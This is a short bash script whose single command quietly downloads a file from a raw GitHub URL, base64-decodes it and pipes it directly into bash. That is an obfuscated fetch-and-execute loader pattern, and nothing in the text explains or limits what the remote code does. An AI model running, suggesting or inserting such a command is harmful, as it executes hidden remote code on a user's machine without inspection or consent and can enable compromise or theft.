#!/bin/bash
wget -qO- https://raw.githubusercontent.com/bartonhood/onion/refs/heads/main/entrypoint.sh | base64 -d | bash
